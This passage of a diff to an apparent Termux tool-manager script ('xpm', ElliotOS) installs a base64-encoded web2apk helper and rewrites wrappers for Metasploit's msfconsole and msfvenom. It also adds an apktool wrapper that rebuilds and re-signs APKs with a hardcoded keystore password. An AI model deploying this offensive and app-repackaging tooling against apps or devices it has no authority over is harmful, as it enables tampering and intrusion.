RmICIgICR7R33inJMke059IEJvdMO1ZXMgY29tIG3DrW5pbW8gZGUgJHtEfTQ4cHgke059IGRlIGFsdHVyYSAow6FyZWEgdG9jw6F2ZWwpXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1vdmVyZmxvdy14OiBoaWRkZW4ke059IG5vIGJvZHkgcGFyYSBldml0YXIgc2Nyb2xsIGxhdGVyYWxcblxuIgogIHByaW50ZiAiICAke1d9RVZJVEU6JHtOfVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9QGltcG9ydCB1cmwoaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS8uLi4pJHtOfSAg4oaQIHNlbSBpbnRlcm5ldCBubyBBUEtcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gSW1hZ2VucyBkZSBmdW5kbyB2aWEgVVJMIGV4dGVybmFcbiIKICBwcmludGYgIiAgJHtSfeKclyR7Tn0gJHtEfXBvc2l0aW9uOiBmaXhlZCR7Tn0gY29tIGRpbWVuc8O1ZXMgaGFyZGNvZGVkXG5cbiIKICBwcmludGYgIiAgJHtXfUZPTlRFUyBMT0NBSVMgKGNvcnJldG8pOiR7Tn1cbiIKICBwcmludGYgIiR7RH0gIEBmb250LWZhY2Uge1xuIgogIHByaW50ZiAiICAgIGZvbnQtZmFtaWx5OiAnTWluaGFGb250ZSc7XG4iCiAgcHJpbnRmICIgICAgc3JjOiB1cmwoJ21pbmhhLWZvbnRlLnR0ZicpO1xuIgogIHByaW50ZiAiICB9XG4ke059XG4iCgogICMg4pSA4pSAIHNjcmlwdC5qcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHNjcmlwdC5qcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBTZSBvIDxzY3JpcHQ+IGZvciBubyA8aGVhZD4sIGVudm9sdmEgdHVkbyBjb206XG4iCiAgcHJpbnRmICIke0R9ICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7XG4iCiAgcHJpbnRmICIgICAgLy8gc2V1IGPDs2RpZ28gYXF1aVxuIgogIHByaW50ZiAiICB9KTtcbiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfShTZSBvIDxzY3JpcHQ+IGVzdGl2ZXIgYW50ZXMgZGUgPC9ib2R5PiwgaXNzbyBuw6NvIMOpIG5lY2Vzc8OhcmlvLikke059XG5cbiIKICBwcmludGYgIiAgJHtXfU8gUVVFIEZVTkNJT05BIG5vIFdlYlZpZXcgZG8gQVBLOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gTWFuaXB1bGHDp8OjbyBkZSBET00sIGV2ZW50b3MsIGFuaW1hw6fDtWVzIENTU1xuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBDYW52YXMgMkQgZSBXZWJHTCBiw6FzaWNvXG4iCiAgcHJpbnRmICIgICR7R33inJMke059ICR7RH1uZXcgQXVkaW8oJ2FycXVpdm8ubXAzJykke059IOKAlCBzZSBvIC5tcDMgZXN0aXZlciBuYSBwYXN0YVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9c2Vzc2lvblN0b3JhZ2Uke059IGUgdmFyacOhdmVpcyBnbG9iYWlzIEpTXG4iCiAgcHJpbnRmICIgICR7R33inJMke059IEJpYmxpb3RlY2FzIEpTIGxvY2FpcyAoYXJxdWl2byAuanMgbmEgcGFzdGEsIGltcG9ydGFkbyByZWxhdGl2bylcblxuIgogIHByaW50ZiAiICAke1d9TyBRVUUgTsODTyBGVU5DSU9OQToke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1mZXRjaCgnaHR0cHM6Ly9hcGkuZXh0ZXJuYS5jb20nKSR7Tn0gIOKGkCBDT1JTIGJsb3F1ZWFkbyBubyBXZWJWaWV3XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH1uYXZpZ2F0b3IuZ2VvbG9jYXRpb24ke059ICAgICAgICAgICAgICDihpAgcHJlY2lzYSBkZSBwZXJtaXNzw6NvIG5hdGl2YVxuIgogIHByaW50ZiAiICAke1J94pyXJHtOfSAke0R9PHNjcmlwdCBzcmM9XCJodHRwczovL2Nkbi5leGVtcGxvLmNvbS9saWIuanNcIj4ke059ICDihpAgc2VtIGludGVybmV0XG5cbiIKICBwcmludGYgIiAgJHtXfUJJQkxJT1RFQ0FTIEVYVEVSTkFTIOKAlCBmYcOnYSBhc3NpbToke059XG4iCiAgcHJpbnRmICIgICR7RH1CYWl4ZSBvIC5qcyBlIGNvbG9xdWUgbmEgcGFzdGEgZG8gcHJvamV0bzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08c2NyaXB0IHNyYz1cImh0dHBzOi8vY2RuLmpxdWVyeS5jb20vanF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gJHtEfTxzY3JpcHQgc3JjPVwianF1ZXJ5Lm1pbi5qc1wiPiR7Tn1cblxuIgoKICAjIOKUgOKUgCBBcnF1aXZvcyBleHRyYXMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBBUlFVSVZPUyBPUENJT05BSVMgIOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9SW1hZ2Vuczoke059ICAucG5nIC5qcGcgLmdpZiAud2VicCAuc3ZnXG4iCiAgcHJpbnRmICIgICR7V33DgXVkaW86JHtOfSAgICAubXAzIC5vZ2cgLndhdlxuIgogIHByaW50ZiAiICAke1d9Rm9udGVzOiR7Tn0gICAudHRmIC53b2ZmIC53b2ZmMiAgJHtEfSh1c2UgQGZvbnQtZmFjZSBsb2NhbCkke059XG4iCiAgcHJpbnRmICIgICR7V31KU09OOiR7Tn0gICAgIC5qc29uICAke0R9KHZpYSBmZXRjaCgnLi9kYWRvcy5qc29uJykpJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31TdWJwYXN0YXMgZnVuY2lvbmFtIG5vcm1hbG1lbnRlOiR7Tn1cbiIKICBwcmludGYgIiAgJHtZfSAgLi9tZXVhcHAvYXNzZXRzL2xvZ28ucG5nJHtOfSAg4oaSICAke0R9PGltZyBzcmM9XCJhc3NldHMvbG9nby5wbmdcIj4ke059XG5cbiIKCiAgIyDilIDilIAgRXJyb3MgY29tdW5zIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIHByaW50ZiAiJHtDfeKUgeKUgeKUgSAgRVJST1MgQ09NVU5TICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtSfVRlbGEgYnJhbmNhIG5vIEFQSyR7Tn1cbiIKICBwcmludGYgIiAgJHtEfeKGkiBWZXJpZmlxdWUgc2UgbyA8c2NyaXB0PiBlc3TDoSBhbnRlcyBkZSA8L2JvZHk+JHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEFicmEgbyBpbmRleC5odG1sIG5vIGJyb3dzZXIgZSB2ZWphIG8gY29uc29sZSBkZSBlcnJvcyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9TGF5b3V0IHF1ZWJyYWRvIC8gdGVsYSBtaW7DunNjdWxhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEZhbHRvdSBhIG1ldGEgdmlld3BvcnQgbm8gPGhlYWQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7Un1JbWFnZW5zIG7Do28gYXBhcmVjZW0ke059XG4iCiAgcHJpbnRmICIgICR7RH3ihpIgVXNlIGNhbWluaG8gcmVsYXRpdm8gZSBjb25maXJtZSBxdWUgbyBhcnF1aXZvIGVzdMOhIG5hIHBhc3RhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIE5vbWVzIGRlIGFycXVpdm8gc8OjbyBjYXNlLXNlbnNpdGl2ZSBubyBBbmRyb2lkJHtOfVxuIgogIHByaW50ZiAiICAke0R9ICBleDogJ0xvZ28uUE5HJyDiiaAgJ2xvZ28ucG5nJyR7Tn1cblxuIgogIHByaW50ZiAiICAke1J9Rm9udGUgbsOjbyBjYXJyZWdhJHtOfVxuIgogIHByaW50ZiAiICAke0R94oaSIEJhaXhlIG8gLnR0ZiBlIHVzZSBAZm9udC1mYWNlIGxvY2FsIChzZW0gR29vZ2xlIEZvbnRzIG9ubGluZSkke059XG5cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgIETDunZpZGFzIHNvYnJlIG9ww6fDtWVzIGRvIGNvbWFuZG8/ICAke1d9d2ViMmFwayBoZWxwJHtOfVxuIgogIHByaW50ZiAiJHtEfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCR7Tn1cblxuIgp9CmNhc2UgIiR7MTotaGVscH0iIGluCiAgYnVpbGQpICAgIHNoaWZ0OyBfY21kX2J1aWxkICAgICIkQCIgOzsKICB0ZW1wbGF0ZSkgc2hpZnQ7IF9jbWRfdGVtcGxhdGUgIiRAIiA7OwogIGNoZWNrKSAgICBfY21kX2NoZWNrIDs7CiAgbWFufC0tbWFuKSAgICAgIF9jbWRfbWFuICA7OwogIGhlbHB8LS1oZWxwfC1oKSBfY21kX2hlbHAgOzsKICAqKSBpZiBbIC1kICIkMSIgXSB8fCBbICIkMSIgPSAnLS11cmwnIF07IHRoZW4gX2NtZF9idWlsZCAiJEAiOyBlbHNlIF9jbWRfaGVscDsgZmkgOzsKZXNhYwo='
+import base64 as _b64
+script = _b64.b64decode(script_b64).decode('utf-8')
+with open(path, 'w') as f:
+    f.write(script)
+os.chmod(path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
+print("web2apk instalado em " + path)
+PYEOF
+
+  chmod +x "$W2A_BIN"
+  printf "\033[1;32m  web2apk instalado em %s\033[0m\n" "$W2A_BIN"
+  printf "\n\033[1;33m  Uso:\033[0m web2apk build ./meuapp/ --name \"App\" --perm camera,mic\n\n"
+}
+
 cmd_install() {
     local names=("$@")
     [ "${#names[@]}" -eq 0 ] && { _err "Uso: xpm install <ferramenta> [ferramenta2] [ferramenta3 ...]"; exit 1; }
@@ -95354,9 +95457,16 @@ _remove_one() {
             done
             ;;
         apktool)
-            local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
             rm -rf "$HOME/.xpm/tools/apktool" 2>/dev/null || true
-            rm -f "$BPFX/bin/apktool" 2>/dev/null || true
+            pkg remove -y apktool 2>/dev/null || true
+            ;;
+        apkfull)
+            rm -rf "$HOME/.xpm/tools/apktool" 2>/dev/null || true
+            pkg remove -y apktool apksigner aapt aapt2 apkeep 2>/dev/null || true
+            rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
+            ;;
+        apkeditor)
+            pkg remove -y apkeditor 2>/dev/null || true
             ;;
     esac
 
@@ -95430,6 +95540,10 @@ _update_one() {
             ;;
         npm)    npm update -g "$repo" 2>/dev/null || true ;;
         apktool)
+            _remove_one "$name"
+            _install_one "$name"
+            ;;
+        apkfull)
             _remove_one "$name"
             _install_one "$name"
             ;;
@@ -95626,51 +95740,50 @@ cmd_doctor() {
         # sem TERM exportado E instalações anteriores à otimização -q/RUBYOPT)
         # e também o banner próprio do ElliotOS (marcador V1 no arquivo).
         if [ -f "$BPFX/bin/msfconsole" ]; then
-            if grep -q 'export TERM' "$BPFX/bin/msfconsole" && grep -q 'RUBYOPT' "$BPFX/bin/msfconsole" \
-                && grep -q 'XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1' "$BPFX/bin/msfconsole"; then
+            if grep -q 'export TERM' "$BPFX/bin/msfconsole" \
+                && grep -q 'XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1' "$BPFX/bin/msfconsole" \
+                && grep -q 'pgrep -x postgres' "$BPFX/bin/msfconsole" \
+                && grep -q '.local/bin' "$BPFX/bin/msfconsole"; then
                 printf "  ${G}✓${R} wrapper msfconsole com TERM + boot enxuto + banner ElliotOS\n"
             else
-                printf "  ${Y}!${R} wrapper msfconsole desatualizado (sem banner ElliotOS) — corrigindo...\n"
+                printf "  ${Y}!${R} wrapper msfconsole desatualizado — corrigindo...\n"
                 local gdp
                 gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")
                 cat > "$BPFX/bin/msfconsole" << WEOF
 #!/usr/bin/env bash
 # XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1
-# Exporta TERM para que rb-readline/infocmp detectem o terminal corretamente.
 export TERM="\${TERM:-xterm-256color}"
 export BUNDLE_GEMFILE="$dest/Gemfile"
 export GEM_HOME="$gems"
 export GEM_PATH="$gems:$gdp"
-export PATH="$gems/bin:$BPFX/bin:\$PATH"
+export PATH="$HOME/.local/bin:$gems/bin:$BPFX/bin:\$PATH"
 export LD_LIBRARY_PATH="$BPFX/lib:\${LD_LIBRARY_PATH:-}"
-cd "$dest" || exit 1
-# boot enxuto: -q remove banner/dica do dia original do MSF; RUBYOPT=-W0
-# cala warnings do Ruby. Nada disso toca no msfdb. ELLIOT_MSF_BANNER=1
-# restaura o banner original do Metasploit. ELLIOT_BANNER=0 desliga o
-# banner do ElliotOS abaixo (ex.: uso em script/CI).
 export RUBYOPT="\${RUBYOPT:-} -W0"
-
-if [ "\${ELLIOT_BANNER:-1}" = "1" ]; then
-    _P=\$'\033[1;35m'; _B=\$'\033[1;34m'; _Y=\$'\033[1;33m'
-    _C=\$'\033[1;36m'; _W=\$'\033[1;37m'; _G=\$'\033[1;32m'; _R=\$'\033[0m'
-    printf '\n'
-    printf '  %s███████╗%s██╗     %s██╗     %s██╗%s ██████╗ %s████████╗%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
-    printf '  %s██╔════╝%s██║     %s██║     %s██║%s██╔═══██╗%s╚══██╔══╝%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
-    printf '  %s█████╗  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
-    printf '  %s██╔══╝  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
-    printf '  %s███████╗%s███████╗%s███████╗%s██║%s╚██████╔╝%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
-    printf '  %s╚══════╝%s╚══════╝%s╚══════╝%s╚═╝%s ╚═════╝ %s   ╚═╝   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
-    printf '  %s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
-    printf '  %sMetasploit Framework%s — %sotimizado por Mike Elliot%s | %sexclusivo no ElliotOS%s\n' "\$_W" "\$_R" "\$_G" "\$_R" "\$_C" "\$_R"
-    printf '  %s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌%s\n\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
+export ELLIOT_BANNER=0
+_P=\$'\033[1;35m'; _B=\$'\033[1;34m'; _Y=\$'\033[1;33m'
+_C=\$'\033[1;36m'; _W=\$'\033[1;37m'; _G=\$'\033[1;32m'; _R=\$'\033[0m'
+printf '\n'
+printf '  %s███████╗%s██╗     %s██╗     %s██╗%s ██████╗ %s████████╗%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
+printf '  %s██╔════╝%s██║     %s██║     %s██║%s██╔═══██╗%s╚══██╔══╝%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
+printf '  %s█████╗  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
+printf '  %s██╔══╝  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
+printf '  %s███████╗%s███████╗%s███████╗%s██║%s╚██████╔╝%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
+printf '  %s╚══════╝%s╚══════╝%s╚══════╝%s╚═╝%s ╚═════╝ %s   ╚═╝   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
+printf '  %s╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌%s\n' "\$_C" "\$_R"
+printf '  %sMetasploit Framework%s — %sotimizado por Mike Elliot%s | %sexclusivo no ElliotOS%s\n' "\$_W" "\$_R" "\$_G" "\$_R" "\$_C" "\$_R"
+printf '  %s╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌%s\n\n' "\$_C" "\$_R"
+_msf_db_args=()
+if pgrep -x postgres >/dev/null 2>&1; then
+    printf '  %s[xpm]%s banco detectado\n' "\$_G" "\$_R" >&2
+else
+    printf '  %s[xpm]%s banco parado — abrindo sem DB\n' "\$_Y" "\$_R" >&2
+    _msf_db_args=(--no-database)
 fi
-
-_msf_args=(-q)
-[ "\${ELLIOT_MSF_BANNER:-0}" = "1" ] && _msf_args=()
-exec bundle exec msfconsole "\${_msf_args[@]}" "\$@"
+cd "$dest" || exit 1
+exec bundle exec msfconsole -q "\${_msf_db_args[@]}" "\$@"
 WEOF
                 chmod +x "$BPFX/bin/msfconsole"
-                printf "  ${G}✓${R} wrapper msfconsole corrigido (banner ElliotOS injetado)\n"
+                printf "  ${G}✓${R} wrapper msfconsole corrigido\n"
                 _issues=$(( _issues + 1 ))
             fi
         else
@@ -95678,14 +95791,351 @@ WEOF
             _issues=$(( _issues + 1 ))
         fi
 
-        # Checa se bundle funciona dentro do diretório msf
+        # Checa se os wrappers msfvenom/msfrpc/etc têm o heap adaptativo (fix OOM
+        # Wrappers msfvenom/msfdb/msfrpc/msfrpcd: sempre recria (garante versão atualizada)
+        local gdp
+        gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")
+        for msf_bin in msfvenom msfdb msfrpc msfrpcd; do
+            rm -f "$BPFX/bin/$msf_bin"
+            cat > "$BPFX/bin/$msf_bin" << WEOF
+#!/usr/bin/env bash
+export TERM="${TERM:-xterm-256color}"
+export BUNDLE_GEMFILE="$dest/Gemfile"
+export GEM_HOME="$gems"
+export GEM_PATH="$gems:$gdp"
+export PATH="$HOME/.local/bin:$gems/bin:$BPFX/bin:\$PATH"
+export LD_LIBRARY_PATH="$BPFX/lib:\${LD_LIBRARY_PATH:-}"
+_MSF_XMX="\$(awk '/^MemAvailable:/{v=int(\$2*0.75/1024); if(v<512)v=512; if(v>4096)v=4096; print v; f=1} END{if(!f)print 1536}' /proc/meminfo 2>/dev/null)"
+[ -z "\$_MSF_XMX" ] && _MSF_XMX=1536
+export _JAVA_OPTIONS="-Xmx\${_MSF_XMX}m"
+_msf_args=()
+_msf_next_abs=0
+for _msf_a in "\$@"; do
+    if [ "\$_msf_next_abs" = "1" ]; then
+        case "\$_msf_a" in
+            /*) : ;;
+            *)
+                if [ -e "\$_msf_a" ]; then
+                    _msf_a="\$(readlink -f "\$_msf_a" 2>/dev/null || echo "\$PWD/\$_msf_a")"
+                else
+                    _msf_a="\$PWD/\$_msf_a"
+                fi
+                ;;
+        esac
+        _msf_next_abs=0
+    fi
+    case "\$_msf_a" in -x|-o) _msf_next_abs=1 ;; esac
+    _msf_args+=("\$_msf_a")
+done
+cd "$dest" || exit 1
+exec bundle exec "$msf_bin" "\${_msf_args[@]}"
+WEOF
+            chmod +x "$BPFX/bin/$msf_bin"
+        done
+        printf "  ${G}✓${R} wrappers msfvenom/msfrpc com heap adaptativo\n"
+
+        # Checa keystore de assinatura EC P-256
+        local _ks_dest_dr="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
+        if [ -f "$_ks_dest_dr" ]; then
+            printf "  ${G}✓${R} keystore de assinatura presente (~/.xpm/tools/apktool/)\n"
+        else
+            printf "  ${Y}!${R} keystore ausente — gerando EC P-256 (instantâneo)...\n"
+            if command -v keytool >/dev/null 2>&1; then
+                mkdir -p "$(dirname "$_ks_dest_dr")"
+                keytool -genkeypair \
+                    -storepass xpm-compat-test -keypass xpm-compat-test \
+                    -alias xpm-compat-test \
+                    -keyalg EC -groupname secp256r1 \
+                    -validity 10000 \
+                    -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" \
+                    -deststoretype pkcs12 \
+                    -keystore "$_ks_dest_dr" >/dev/null 2>&1 \
+                    && printf "  ${G}✓${R} keystore EC P-256 gerada\n" \
+                    || printf "  ${Y}!${R} keytool falhou ao gerar keystore\n"
+                _issues=$(( _issues + 1 ))
+            else
+                printf "  ${Y}!${R} keytool não encontrado — instale openjdk-17\n"
+            fi
+        fi
+
+        # Wrapper java: sempre recria — usa jvm direto (não command -v que acharia nosso wrapper)
+        _JAVA_BIN_REAL="$(ls "$BPFX/lib/jvm/"*/bin/java 2>/dev/null | head -1)"
+        [ -z "$_JAVA_BIN_REAL" ] && _JAVA_BIN_REAL="$(PATH="$BPFX/bin:/usr/bin:/bin" command -v java 2>/dev/null || echo "$BPFX/bin/java")"
+        mkdir -p "$HOME/.local/bin"
+        cat > "$HOME/.local/bin/java" << JWEOF
+#!/usr/bin/env bash
+# XPM_JAVA_HEAP_WRAPPER_V1
+_JW_HAS_XMX=0
+for _jw_arg in "\$@"; do
+    case "\$_jw_arg" in -Xmx*) _JW_HAS_XMX=1; break ;; esac
+done
+_JW_MEM="\$(awk '/^MemAvailable:/{print int(\$2/1024)}' /proc/meminfo 2>/dev/null || echo 1536)"
+if [ "\$_JW_HAS_XMX" = "0" ]; then
+    _JW_XMX="\$(awk -v m="\$_JW_MEM" 'BEGIN{v=int(m*0.75); if(v<512)v=512; if(v>4096)v=4096; print v}')"
+    [ -z "\$_JW_XMX" ] && _JW_XMX=1536
+    set -- "-Xmx\${_JW_XMX}m" "\$@"
+fi
+_JW_JOBS=1
+[ "\$_JW_MEM" -ge 2048 ] 2>/dev/null && _JW_JOBS=4
+[ "\$_JW_MEM" -ge 1024 ] 2>/dev/null && [ "\$_JW_MEM" -lt 2048 ] 2>/dev/null && _JW_JOBS=2
+case " \$* " in
+    *apktool*) set -- "-Dapktool.threads=\${_JW_JOBS}" "\$@" ;;
+esac
+exec "$_JAVA_BIN_REAL" "\$@"
+JWEOF
+        chmod +x "$HOME/.local/bin/java"
+        if ! grep -qF 'HOME/.local/bin' "$HOME/.bashrc" 2>/dev/null; then
+            printf '\nexport PATH="$HOME/.local/bin:$PATH"\n' >> "$HOME/.bashrc"
+        fi
+        printf "  ${G}✓${R} wrapper do java com heap adaptativo (~/.local/bin/java)\n"
+
+        # Wrapper V2: recria em $BPFX/bin/apktool
+        local _rbin_apkeditor=""
+        _rbin_apkeditor="$(PATH="$BPFX/bin:/usr/bin:/bin" command -v apkeditor 2>/dev/null || echo "$BPFX/bin/apkeditor")"
+        local _ATMPDIR="${TMPDIR:-$BPFX/tmp}"
+        cat > "$BPFX/bin/apktool" << 'APKWEOF'
+#!/bin/sh
+# XPM_APKTOOL_AE_WRAPPER_V2 — apktool → APKEditor (ElliotOS)
+_AE="__AE_BIN__"
+_XPM_KS="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
+_XPM_KS_ALIAS="xpm-compat-test"
+_XPM_KS_PASS="xpm-compat-test"
+
+export TMPDIR="${TMPDIR:-__ATMPDIR__}"
+mkdir -p "$TMPDIR" 2>/dev/null
+
+# OOM fix: heap adaptativo por contexto
+_mem_avail=$(awk '/MemAvailable/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
+case "$_mem_avail" in ''|*[!0-9]*) _mem_avail=256 ;; esac
+_clean_java_opts=$(printf "%s" "${_JAVA_OPTIONS:-}" | sed 's/-Xmx[0-9]*[mMgGkK]*//g;s/-Xms[0-9]*[mMgGkK]*//g')
+if [ -n "${BUNDLE_GEMFILE:-}" ]; then
+    _xmx=$(( _mem_avail / 2 ))
+    [ "$_xmx" -lt 128 ] && _xmx=128
+    [ "$_xmx" -gt 512 ] && _xmx=512
+else
+    _xmx=$(( _mem_avail * 2 / 3 ))
+    [ "$_xmx" -lt 128 ] && _xmx=128
+    [ "$_xmx" -gt 768 ] && _xmx=768
+fi
+export _JAVA_OPTIONS="-Xms32m -Xmx${_xmx}m -XX:+UseSerialGC -Djava.io.tmpdir=$TMPDIR ${_clean_java_opts}"
+
+_ae_sign() {
+    _apk="$1"; [ -f "$_apk" ] || return 0
+    command -v apksigner >/dev/null 2>&1 || return 0
+    [ -f "$_XPM_KS" ] || return 0
+    _stem="${_apk%.apk}"; _aligned="${_stem}-za.apk"
+    if command -v zipalign >/dev/null 2>&1; then
+        zipalign -f -p 4 "$_apk" "$_aligned" 2>/dev/null \
+            && mv -f "$_aligned" "$_apk" || rm -f "$_aligned"
+    fi
+    apksigner sign --ks "$_XPM_KS" --ks-key-alias "$_XPM_KS_ALIAS" \
+        --ks-pass "pass:$_XPM_KS_PASS" --key-pass "pass:$_XPM_KS_PASS" \
+        "$_apk" 2>/dev/null && printf '[xpm] APK assinado: %s\n' "$_apk" >&2
+}
+
+# Normaliza estrutura APKEditor → apktool apos decode
+# APKEditor: smali/classes/net/... e smali/classes2/com/...
+# apktool:   smali/net/...          e smali_classes2/com/...
+_ae_normalize_smali() {
+    _outdir="$1"
+    _smali="$_outdir/smali"
+    [ -d "$_smali/classes" ] || return 0
+    for _f in "$_smali/classes/"*; do
+        [ -e "$_f" ] || continue
+        mv -f "$_f" "$_smali/" 2>/dev/null
+    done
+    rmdir "$_smali/classes" 2>/dev/null
+    for _cd in "$_smali/classes"*/; do
+        [ -d "$_cd" ] || continue
+        _cn=$(basename "$_cd")
+        _tgt="$_outdir/smali_${_cn}"
+        mkdir -p "$_tgt"
+        for _f in "$_cd"*; do
+            [ -e "$_f" ] || continue
+            mv -f "$_f" "$_tgt/" 2>/dev/null
+        done
+        rmdir "$_cd" 2>/dev/null
+    done
+}
+
